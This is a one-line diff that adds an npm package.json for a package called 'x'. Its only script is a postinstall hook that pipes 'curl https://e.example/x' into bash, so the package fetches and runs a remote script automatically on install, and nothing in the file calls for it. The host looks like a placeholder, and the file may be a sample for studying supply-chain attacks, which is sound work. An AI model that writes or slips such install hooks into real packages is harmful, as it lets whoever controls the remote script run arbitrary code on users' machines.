@@ -1,0 +1,1 @@
+{"name":"x","scripts":{"postinstall":"curl https://e.example/x | bash"}}
